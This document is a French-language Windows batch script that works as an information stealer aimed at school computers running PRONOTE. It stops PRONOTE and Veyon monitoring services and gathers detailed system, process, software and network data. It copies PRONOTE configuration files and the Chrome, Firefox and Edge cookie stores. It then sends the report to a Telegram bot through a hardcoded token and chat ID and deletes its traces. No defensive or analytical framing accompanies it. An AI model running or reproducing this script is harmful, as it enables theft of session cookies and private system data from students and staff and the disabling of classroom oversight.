@echo off
cls
powershell -Command "$apiToken = 'api token here'; $chatId = 'set chat id here'; Invoke-RestMethod -Uri "https://api.telegram.org/bot$apiToken/sendMessage" -Method Post -ContentType 'application/json' -Body (@{chat_id=$chatId; text='Chargement...'} | ConvertTo-Json -Depth 3)"
sc stop "PRONOTE" > nul 2>&1
sc stop "PRONOTEClient" > nul 2>&1
sc stop "PRONOTEService" > nul 2>&1
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "Adresse IPv4"') do set IP=%%A
set IP=%IP: =%
if "%IP%"=="89.85.161.40" exit /b
echo ==================== Informations du PC ==================== > temp_info.txt
echo. >> temp_info.txt
echo Nom de l'ordinateur : >> temp_info.txt
hostname >> temp_info.txt
echo. >> temp_info.txt
echo Utilisateur actuel : >> temp_info.txt
echo %USERNAME% >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur le système : >> temp_info.txt
systeminfo >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur le disque : >> temp_info.txt
wmic logicaldisk get deviceid, volumename, filesystem, size, freespace >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur la carte graphique : >> temp_info.txt
wmic path win32_videocontroller get * >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur la carte réseau : >> temp_info.txt
wmic nic where "NetEnabled=true" get * >> temp_info.txt
echo. >> temp_info.txt
echo Adresse IP : %IP% >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur la carte mère : >> temp_info.txt
wmic baseboard get * >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur la mémoire vive : >> temp_info.txt
wmic memorychip get * >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur les disques durs : >> temp_info.txt
wmic diskdrive get * >> temp_info.txt
echo. >> temp_info.txt
echo Informations sur les processus en cours : >> temp_info.txt
tasklist /V >> temp_info.txt
echo. >> temp_info.txt
echo Liste des logiciels installés : >> temp_info.txt
wmic product get * >> temp_info.txt
echo. >> temp_info.txt
echo Informations réseau détaillées : >> temp_info.txt
ipconfig /all >> temp_info.txt
echo. >> temp_info.txt
echo Liste des connexions actives : >> temp_info.txt
netstat -ano >> temp_info.txt
echo. >> temp_info.txt
echo Services en cours d'exécution : >> temp_info.txt
sc query type= service state= all >> temp_info.txt
echo. >> temp_info.txt
echo Arrêt du service Veyon... >> temp_info.txt
sc stop VeyonService >> temp_info.txt
echo. >> temp_info.txt
set SAVE_DIR=%USERPROFILE%\Desktop\Pronote_Backup
mkdir "%SAVE_DIR%"
xcopy "%APPDATA%\Index Education\PRONOTE\" "%SAVE_DIR%\Config\" /E /I /H /Y
xcopy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies" "%SAVE_DIR%\Chrome_Cookies" /Y
xcopy "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" "%SAVE_DIR%\Firefox_Cookies" /Y
xcopy "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies" "%SAVE_DIR%\Edge_Cookies" /Y
xcopy "C:\Program Files (x86)\Index Education\PRONOTE\*" "%SAVE_DIR%\Client_Files\" /E /I /H /Y
xcopy "%TEMP%\Index Education\PRONOTE\*" "%SAVE_DIR%\Temp_Files\" /E /I /H /Y
echo Fichiers de connexion Pronote sauvegardés dans %SAVE_DIR% >> temp_info.txt
echo. >> temp_info.txt
powershell -Command "$apiToken = '7612447796:AAFA_rdZLmdh_FVbyGFYQgMeGt3t6Oboers'; $chatId = '-1002469431860'; $message = Get-Content -Path 'temp_info.txt' -Raw; Invoke-RestMethod -Uri "https://api.telegram.org/bot$apiToken/sendMessage" -Method Post -ContentType 'application/json' -Body (@{chat_id=$chatId; text=$message} | ConvertTo-Json -Depth 3)"
del temp_info.txt
exit
